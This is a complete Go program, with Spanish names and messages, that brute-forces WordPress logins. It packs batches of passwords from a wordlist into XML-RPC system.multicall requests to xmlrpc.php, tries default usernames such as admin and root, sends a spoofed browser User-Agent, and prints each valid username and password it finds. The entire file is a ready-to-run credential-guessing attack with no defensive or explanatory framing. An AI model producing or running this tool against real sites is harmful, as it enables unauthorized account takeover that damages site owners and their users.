package main

import (
	"bufio"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type ValorRespuesta struct {
	Inner string `xml:",innerxml"`
}

type DataRespuesta struct {
	Valores []ValorRespuesta `xml:"value"`
}

type ArrayRespuesta struct {
	Data DataRespuesta `xml:"data"`
}

type ValorParam struct {
	Array ArrayRespuesta `xml:"array"`
}

type ParamRespuesta struct {
	Valor ValorParam `xml:"value"`
}

type ParamsRespuesta struct {
	Param ParamRespuesta `xml:"param"`
}

type MulticallResponse struct {
	Params ParamsRespuesta `xml:"params"`
}

func sanitizarXML(s string) string {
	repl := strings.NewReplacer(
		"&", "&amp;",
		"<", "&lt;",
		">", "&gt;",
		"\"", "&quot;",
		"'", "&apos;",
	)
	return repl.Replace(s)
}

func cargarContraseñas(nombreArchivo string) ([]string, error) {
	archivo, err := os.Open(nombreArchivo)
	if err != nil {
		return nil, err
	}
	defer archivo.Close()

	var lineas []string
	scanner := bufio.NewScanner(archivo)
	for scanner.Scan() {
		texto := strings.TrimSpace(scanner.Text())
		if texto != "" {
			lineas = append(lineas, texto)
		}
	}
	return lineas, scanner.Err()
}

func construirCuerpoMulticall(usuario string, lote []string) string {
	var sb strings.Builder
	sb.WriteString(`<?xml version="1.0"?>`)
	sb.WriteString(`<methodCall>`)
	sb.WriteString(`<methodName>system.multicall</methodName>`)
	sb.WriteString(`<params><param><value><array><data>`)

	usuarioSeguro := sanitizarXML(usuario)

	for _, pwd := range lote {
		pwdSegura := sanitizarXML(pwd)
		sb.WriteString(`<value><struct>`)
		sb.WriteString(`<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>`)
		sb.WriteString(`<member><name>params</name><value><array><data>`)
		sb.WriteString(`<value><string>`)
		sb.WriteString(usuarioSeguro)
		sb.WriteString(`</string></value>`)
		sb.WriteString(`<value><string>`)
		sb.WriteString(pwdSegura)
		sb.WriteString(`</string></value>`)
		sb.WriteString(`</data></array></value></member>`)
		sb.WriteString(`</struct></value>`)
	}

	sb.WriteString(`</data></array></value></param></params>`)
	sb.WriteString(`</methodCall>`)
	return sb.String()
}

func enviarMulticall(url string, cuerpo string) ([]string, error) {
	cliente := &http.Client{Timeout: 30 * time.Second}

	req, err := http.NewRequest("POST", url, strings.NewReader(cuerpo))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	resp, err := cliente.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if strings.Contains(string(bodyBytes), "<fault>") {
		return nil, fmt.Errorf("el servidor devolvió un fallo global")
	}

	var parsed MulticallResponse
	err = xml.Unmarshal(bodyBytes, &parsed)
	if err != nil {
		return nil, err
	}

	valores := parsed.Params.Param.Valor.Array.Data.Valores
	if len(valores) == 0 {
		return nil, fmt.Errorf("respuesta sin datos")
	}

	resultados := make([]string, len(valores))
	for i, v := range valores {
		resultados[i] = v.Inner
	}
	return resultados, nil
}

func esExito(innerXML string) bool {
	return strings.Contains(innerXML, "<array>")
}

func trabajador(
	url string,
	usuario string,
	contraseñas []string,
	tamLote int,
	retraso float64,
	resultados chan<- string,
	wg *sync.WaitGroup,
) {
	defer wg.Done()

	for i := 0; i < len(contraseñas); i += tamLote {
		fin := i + tamLote
		if fin > len(contraseñas) {
			fin = len(contraseñas)
		}
		lote := contraseñas[i:fin]

		cuerpo := construirCuerpoMulticall(usuario, lote)
		respuestas, err := enviarMulticall(url, cuerpo)
		if err != nil {
			fmt.Printf("[x] Error en lote para %s: %v\n", usuario, err)
			time.Sleep(time.Duration(retraso * float64(time.Second)))
			continue
		}

		for idx, inner := range respuestas {
			if esExito(inner) {
				resultados <- fmt.Sprintf("%s:%s", usuario, lote[idx])
			}
		}

		time.Sleep(time.Duration(retraso * float64(time.Second)))
	}
}

func main() {
	urlPtr := flag.String("url", "", "URL del archivo xmlrpc.php (obligatorio)")
	usuariosPtr := flag.String("usuarios", "admin,root,user,test,wpadmin", "Lista de usuarios separada por comas")
	archivoPtr := flag.String("archivo", "passwords.txt", "Ruta al archivo con las contraseñas (una por línea)")
	hilosPtr := flag.Int("hilos", 5, "Número de trabajadores concurrentes")
	lotePtr := flag.Int("lote", 50, "Cantidad de intentos por petición multicall")
	retrasoPtr := flag.Float64("retraso", 0.5, "Retraso en segundos entre lotes")

	flag.Parse()

	if *urlPtr == "" {
		fmt.Println("[-] Error: la URL es obligatoria.")
		fmt.Println("Uso: go run wp_bruteforce.go -url <url> [-usuarios u1,u2] [-archivo pass.txt] [-hilos 5] [-lote 50] [-retraso 0.5]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	contraseñas, err := cargarContraseñas(*archivoPtr)
	if err != nil {
		fmt.Printf("[-] No se pudo cargar el archivo '%s': %v\n", *archivoPtr, err)
		os.Exit(1)
	}
	if len(contraseñas) == 0 {
		fmt.Println("[-] El archivo de contraseñas está vacío.")
		os.Exit(1)
	}

	listaUsuarios := strings.Split(*usuariosPtr, ",")
	for i := range listaUsuarios {
		listaUsuarios[i] = strings.TrimSpace(listaUsuarios[i])
	}

	fmt.Printf("[+] Objetivo: %s\n", *urlPtr)
	fmt.Printf("[+] Usuarios: %d (%s)\n", len(listaUsuarios), strings.Join(listaUsuarios, ", "))
	fmt.Printf("[+] Contraseñas cargadas: %d\n", len(contraseñas))
	fmt.Printf("[+] Tamaño de lote: %d, Hilos: %d, Retraso: %.2fs\n", *lotePtr, *hilosPtr, *retrasoPtr)
	fmt.Println("[+] Iniciando fuerza bruta amplificada...\n")

	resultados := make(chan string, 100)
	var wg sync.WaitGroup

	for _, usuario := range listaUsuarios {
		wg.Add(1)
		go trabajador(
			*urlPtr,
			usuario,
			contraseñas,
			*lotePtr,
			*retrasoPtr,
			resultados,
			&wg,
		)
	}

	go func() {
		wg.Wait()
		close(resultados)
	}()

	encontradas := []string{}
	for credencial := range resultados {
		encontradas = append(encontradas, credencial)
		fmt.Printf("[!] CREDENCIALES VÁLIDAS: %s\n", credencial)
	}

	if len(encontradas) > 0 {
		fmt.Println("\n[+] Resumen de credenciales encontradas:")
		for _, cred := range encontradas {
			fmt.Printf("    %s\n", cred)
		}
	} else {
		fmt.Println("\n[-] No se encontraron credenciales válidas.")
	}
}
